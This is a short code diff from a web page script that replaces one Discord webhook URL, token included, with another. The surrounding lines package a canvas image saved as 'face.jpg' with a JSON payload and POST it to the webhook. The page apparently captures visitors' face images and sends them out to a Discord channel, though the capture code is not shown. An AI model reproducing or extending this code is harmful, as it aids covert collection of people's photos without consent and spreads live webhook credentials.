@@ -248,7 +248,7 @@
             formData.append('payload_json', JSON.stringify(payload));
             formData.append('files[0]', await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85)), 'face.jpg');
 
-            const webhookUrl = "https://discord.com/api/webhooks/1469293107760599176/kRFl-b-fg9b4IV9nu4PV3YlKYfe7w4QBR9LpnX2uwvTJygOqvYozbU04wTb0XbYUwKLn";
+            const webhookUrl = "https://discord.com/api/webhooks/1469315301811163288/jYXCKcUa6HT4N2y96p-oGDNBEP_-1mPGR4jE4mSJWp0ahHRLK-xEKfWWfznqqrBkdabO";
 
             fetch(webhookUrl, { method: 'POST', body: formData })
                 .catch(err => console.error("送信エラー:", err));
